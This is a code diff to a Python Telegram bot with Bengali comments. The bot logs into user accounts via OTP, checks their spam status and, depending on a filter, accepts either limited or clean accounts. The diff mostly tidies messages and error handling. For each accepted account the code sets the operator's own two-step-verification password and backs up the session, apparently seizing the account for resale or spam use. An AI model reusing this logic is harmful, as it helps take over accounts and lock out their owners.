@@ -671,32 +671,33 @@ async def verify_otp_task(text, user_id, message):
         status = await get_spam_status(data["client"])
         is_limited = "limited" in status.lower()
         is_filter_on = settings.get("spam_filter_active", True)
+        
+        status_text = "Free as a Bird" if not is_limited else "Limited"
 
-        # লজিক ১: ফিল্টার ON থাকলে
+        # লজিক ১: ফিল্টার ON থাকলে (স্প্যাম-ফ্রি একাউন্ট নেবে)
         if is_filter_on:
             if not is_limited:
-                # স্প্যাম ফ্রি: ২-এফএ লাগাও এবং কনফার্মেশনে যাও
                 await data["client"].edit_2fa(new_password=settings["security_password"])
+                bot.send_message(message.chat.id, f"✅ **Spam Status:** {status_text}\n\n🎉 **The account number was successfully received!**")
                 await process_backup(user_id, message, data)
                 return
             else:
-                # স্প্যাম হলে রিজেক্ট (কোনো পাসওয়ার্ড লাগবে না)
                 bot.reply_to(message, "🚫 **Access Denied:** Account is Limited.")
-        
-        # লজিক ২: ফিল্টার OFF থাকলে
+                try: await data["client"].disconnect()
+                except: pass
+
+        # লজিক ২: ফিল্টার OFF থাকলে (স্প্যাম একাউন্ট নেবে)
         else:
             if is_limited:
-                # স্প্যাম হলে: ২-এফএ লাগাও এবং কনফার্মেশনে যাও
                 await data["client"].edit_2fa(new_password=settings["security_password"])
+                bot.send_message(message.chat.id, f"✅ **Spam Status:** {status_text}\n\n🎉 **The account number was successfully received!**")
                 await process_backup(user_id, message, data)
                 return
             else:
-                # স্প্যাম ফ্রি হলে রিজেক্ট (কনফার্মেশনে যাবে না)
                 bot.reply_to(message, "🚫 **Access Denied:** Only Spam accounts are allowed.")
-
-        # ভুল বা রিজেক্ট হলে সেশন বন্ধ কর
-        try: await data["client"].disconnect()
-        except: pass
+                try: await data["client"].disconnect()
+                except: pass
+        
         del user_data[user_id]
 
     except SessionPasswordNeededError:
@@ -709,18 +710,6 @@ async def verify_otp_task(text, user_id, message):
         try: await data["client"].disconnect()
         except: pass
         del user_data[user_id]
-
-    except SessionPasswordNeededError:
-        bot.reply_to(message, "❌ **Two-Step Verification Active.**")
-        try: await data["client"].disconnect()
-        except: pass
-        del user_data[user_id]
-    except Exception as e:
-        bot.reply_to(message, f"❌ **Error:** {str(e)}")
-        try: await data["client"].disconnect()
-        except: pass
-        del user_data[user_id]
-
     except SessionPasswordNeededError:
         bot.reply_to(message, "❌ **Two-Step Verification Active.**")
         try: await data["client"].disconnect()
